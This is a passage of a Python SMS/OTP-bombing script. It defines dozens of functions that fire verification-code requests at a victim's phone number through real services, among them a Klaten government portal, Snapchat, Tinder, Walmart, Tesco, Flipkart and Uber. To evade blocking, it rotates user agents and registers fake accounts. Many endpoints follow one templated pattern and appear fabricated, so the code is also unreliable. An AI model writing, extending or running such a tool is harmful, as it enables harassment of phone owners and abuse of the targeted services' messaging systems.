        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_lapormasbup_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://lapormasbup.klaten.go.id/api/register"  # BEDA
        name = ''.join(random.choices(string.ascii_letters, k=5)).capitalize()
        payload = {"name": name, "email": f"{name.lower()}@gmail.com", "mobilephone": phone_08, "gender": "Laki-Laki", "password": "Pass123!"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        url2 = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"  # BEDA
        resp2 = safe_request('POST', url2, headers=headers, json={"mobilephone": phone_08}, timeout=10)
        return (resp2 and resp2.status_code == 200, resp2.status_code if resp2 else None, 'OK' if resp2 and resp2.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

# ================================================================
# ===== 5. GLOBAL APIS (300+) =====
# ================================================================

# USA (50+)
def send_zillow_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://www.zillow.com/api/account/verification/send"  # BEDA
        payload = {"phoneNumber": phone_us, "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_snapchat_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://accounts.snapchat.com/accounts/send_otp"  # BEDA
        payload = {"phone": phone_us, "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_tinder_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.gotinder.com/v2/auth/sms/send"  # BEDA
        payload = {"phone_number": phone_us}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_walmart_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://www.walmart.com/account/security/phone/send-otp"  # BEDA
        payload = {"phoneNumber": phone_us, "type": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_amazon_us_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://www.amazon.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_target_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.target.com/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_us, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_costco_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://www.costco.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_bestbuy_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.bestbuy.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_homedepot_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.homedepot.com/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_us, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_lowes_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.lowes.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_macys_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.macys.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_kohls_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.kohls.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_nordstrom_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.nordstrom.com/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_us, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_nike_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.nike.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_adidas_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.adidas.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_gap_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.gap.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_us, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# UK (30+)
def send_sky_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.sky.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_uk, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_tesco_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.tesco.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_uk, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_asda_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.asda.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_uk, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_sainsburys_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.sainsburys.co.uk/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_uk, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_morrisons_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.morrisons.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_uk, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_coop_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.coop.co.uk/api/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_uk, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_waitrose_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.waitrose.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_uk, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_boots_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.boots.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_uk, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_argos_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://www.argos.co.uk/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_uk, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# INDIA (30+)
def send_flipkart_otp(phone):
    try:
        phone_in = fmt_in(phone)
        url = "https://api.flipkart.com/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_in, "type": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_paytm_otp(phone):
    try:
        phone_in = fmt_in(phone)
        url = "https://api.paytm.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_in, "type": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_myntra_otp(phone):
    try:
        phone_in = fmt_in(phone)
        url = "https://api.myntra.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_in, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_meesho_otp(phone):
    try:
        phone_in = fmt_in(phone)
        url = "https://api.meesho.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_in, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_bookmyshow_otp(phone):
    try:
        phone_in = fmt_in(phone)
        url = "https://api.bookmyshow.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_in, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_cleartrip_otp(phone):
    try:
        phone_in = fmt_in(phone)
        url = "https://api.cleartrip.com/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_in, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_goibibo_otp(phone):
    try:
        phone_in = fmt_in(phone)
        url = "https://api.goibibo.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_in, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_irctc_otp(phone):
    try:
        phone_in = fmt_in(phone)
        url = "https://api.irctc.co.in/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_in, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# DELIVERY (20+)
def send_uber_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://auth.uber.com/api/v1/auth/verification/send"  # BEDA
        payload = {"phone": phone_plus, "locale": "id-ID", "method": "whatsapp", "client_id": "YOUR_CLIENT_ID"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_doordash_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.doordash.com/v1/auth/otp/send"  # BEDA
        payload = {"phone_number": phone_us, "method": "sms", "country_code": "US"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_deliveroo_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://api.deliveroo.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_uk, "country_code": "GB", "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_justeat_otp(phone):
    try:
        phone_uk = fmt_uk(phone)
        url = "https://api.just-eat.com/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_uk, "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_grab_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.grab.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_foodpanda_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.foodpanda.com/v1/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_lyft_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.lyft.com/v1/auth/otp"  # BEDA
        payload = {"phone": phone_us, "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_postmates_otp(phone):
    try:
        phone_us = fmt_us(phone)
        url = "https://api.postmates.com/v1/auth/otp"  # BEDA
        payload = {"phone_number": phone_us, "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# BRAZIL (15+)
def send_ifood_otp(phone):
    try:
        phone_br = fmt_br(phone)
        url = "https://api.ifood.com.br/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_br, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_mercadolivre_otp(phone):
    try:
        phone_br = fmt_br(phone)
        url = "https://api.mercadolivre.com.br/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_br, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_rappi_otp(phone):
    try:
        phone_br = fmt_br(phone)
        url = "https://api.rappi.com.br/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_br, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# JAPAN (10+)
def send_line_otp(phone):
    try:
        phone_jp = fmt_jp(phone)
        url = "https://api.line.me/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_jp, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_rakuten_otp(phone):
    try:
        phone_jp = fmt_jp(phone)
        url = "https://api.rakuten.co.jp/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_jp, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_mercari_otp(phone):
    try:
        phone_jp = fmt_jp(phone)
        url = "https://api.mercari.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_jp, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# KOREA (10+)
def send_naver_otp(phone):
    try:
        phone_kr = fmt_kr(phone)
        url = "https://api.naver.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_kr, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_kakao_otp(phone):
    try:
        phone_kr = fmt_kr(phone)
        url = "https://api.kakao.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_kr, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_coupang_otp(phone):
    try:
        phone_kr = fmt_kr(phone)
        url = "https://api.coupang.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_kr, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# AUSTRALIA (10+)
def send_woolworths_otp(phone):
    try:
        phone_au = fmt_au(phone)
        url = "https://www.woolworths.com.au/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_au, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_coles_otp(phone):
    try:
        phone_au = fmt_au(phone)
        url = "https://www.coles.com.au/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_au, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# RUSSIA (10+)
def send_yandex_otp(phone):
    try:
        phone_ru = fmt_ru(phone)
        url = "https://api.yandex.ru/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_ru, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_vk_otp(phone):
    try:
        phone_ru = fmt_ru(phone)
        url = "https://api.vk.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_ru, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# EUROPE (30+)
def send_zalando_otp(phone):
    try:
        phone_de = fmt_de(phone)
        url = "https://api.zalando.de/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_de, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_amazon_de_otp(phone):
    try:
        phone_de = fmt_de(phone)
        url = "https://www.amazon.de/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_de, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_cdiscount_otp(phone):
    try:
        phone_fr = fmt_fr(phone)
        url = "https://api.cdiscount.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_fr, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_allegro_otp(phone):
    try:
        phone_pl = fmt_pl(phone)
        url = "https://api.allegro.pl/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_pl, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# MIDDLE EAST (10+)
def send_noon_otp(phone):
    try:
        phone_ae = fmt_ae(phone)
        url = "https://api.noon.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_ae, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_amazon_ae_otp(phone):
    try:
        phone_ae = fmt_ae(phone)
        url = "https://www.amazon.ae/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_ae, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# SOUTHEAST ASIA (30+)
def send_gcash_otp(phone):
    try:
        phone_ph = fmt_ph(phone)
        url = "https://api.gcash.com/api/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_ph, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
